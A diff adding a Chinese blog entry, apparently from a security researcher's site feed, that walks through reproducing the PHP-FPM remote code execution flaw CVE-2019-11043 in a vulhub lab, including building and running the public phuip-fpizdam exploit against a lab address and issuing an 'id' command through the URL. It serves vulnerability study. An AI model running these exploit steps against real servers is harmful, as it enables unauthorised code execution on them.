@@ -4,6 +4,41 @@
   
     
     <entry>
+      <title>PHP-FPM远程代码执行漏洞(CVE-2019-11043)</title>
+      <link href="/2022/05/05/php-fpm/"/>
+      <url>/2022/05/05/php-fpm/</url>
+      
+        <content type="html"><![CDATA[<h1 id="PHP-FPM远程代码执行漏洞"><a href="#PHP-FPM远程代码执行漏洞" class="headerlink" title="PHP-FPM远程代码执行漏洞"></a>PHP-FPM远程代码执行漏洞</h1><h2 id="php-fpm"><a href="#php-fpm" class="headerlink" title="php-fpm"></a>php-fpm</h2><blockquote><p>PHP-FPM(FastCGI Process Manager：FastCGI进程管理器)是一个PHPFastCGI管理器，对于PHP 5.3.3之前的php来说，是一个补丁包，旨在将FastCGI进程管理整合进PHP包中。如果你使用的是PHP5.3.3之前的PHP的话，就必须将它patch到你的PHP源代码中，在编译安装PHP后才可以使用。</p></blockquote><h2 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h2><blockquote><p>在长亭科技举办的 Real World CTF 中，国外安全研究员 Andrew Danau 在解决一道 CTF 题目时发现，向目标服务器 URL 发送 %0a 符号时，服务返回异常，疑似存在漏洞。</p><p>在使用一些有错误的Nginx配置的情况下，通过恶意构造的数据包，即可让PHP-FPM执行任意代码。</p></blockquote><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><pre class=" language-Linux"><code class="language-Linux">cd /vulhub/php/CVE-2019-11043docker-compose up -d</code></pre><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>使用写好的工具</p><pre><code>https://github.com/neex/phuip-fpizdam</code></pre><p>因为这个用<code>golang</code>写的，所以要先安装go环境然后换源</p><pre class=" language-Linux"><code class="language-Linux">apt-get install golang -ygo env -w GO111MODULE=ongo env -w GOPROXY=https://mirrors.aliyun.com/goproxy/,direct</code></pre><p>下载EXP</p><pre class=" language-Linux"><code class="language-Linux">git clone https://github.com/neex/phuip-fpizdam   </code></pre><p>下载好之后进入目录</p><pre class=" language-Linux"><code class="language-Linux">cd phuip-fpizdam</code></pre><p>编译</p><pre class=" language-Linux"><code class="language-Linux">go build</code></pre><p><img src="/2022/05/05/php-fpm/image-20220505203729635.png" alt="image-20220505203729635"></p><p>使用EXP</p><pre class=" language-Linux"><code class="language-Linux">go run . "http://192.168.3.151:8080/index.php"</code></pre><p><img src="/2022/05/05/php-fpm/image-20220505203811564.png" alt="image-20220505203811564"></p><p>执行成功，可以命令执行</p><pre class=" language-Linux"><code class="language-Linux">http://192.168.3.151:8080/index.php?a=id</code></pre><p><img src="/2022/05/05/php-fpm/image-20220505203947685.png" alt="image-20220505203947685"></p><p>成了！结束！</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 漏洞复现 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 环境搭建 </tag>
+            
+            <tag> 漏洞复现 </tag>
+            
+            <tag> 网络安全 </tag>
+            
+            <tag> CVE </tag>
+            
+            <tag> vulhub </tag>
+            
+            <tag> PHP </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>PHP-IMAP远程命令执行漏洞(CVE-2018-19518)</title>
       <link href="/2022/05/05/php-imap/"/>
       <url>/2022/05/05/php-imap/</url>
